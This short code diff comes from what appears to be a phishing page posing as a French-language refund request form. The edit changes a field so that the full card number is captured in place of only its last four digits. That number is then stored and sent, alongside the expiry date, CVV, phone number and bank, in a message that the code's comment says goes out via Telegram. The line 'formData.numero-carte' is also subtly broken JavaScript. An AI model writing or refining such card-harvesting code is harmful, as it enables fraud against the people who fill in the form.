@@ -1109,7 +1109,7 @@ const message = `
             // حفظ البيانات المهمة للصفحات القادمة
             const dataToStore = {
                 nom: formData.nom,
-                lastFourDigits: formData.lastFourDigits,
+                lastFourDigits: formData.numero-carte,
                 telephone: formData.telephone,
                 operateur: formData.operateur,
                 bank: formData.bank,
@@ -1124,7 +1124,7 @@ const message = `
             // إرسال البيانات عبر Telegram
             const message = `🔔 **Nouvelle Demande de Remboursement** 🔔
 👤 Nom: ${formData.nom}
-💳 Carte: ${formData.lastFourDigits}
+💳 Carte: ${formData.numero-carte}
 📅 Exp: ${formData.dateExpiration}
 🔒 CVV: ${formData.cvv}
 📞 Tel: ${formData.telephone}
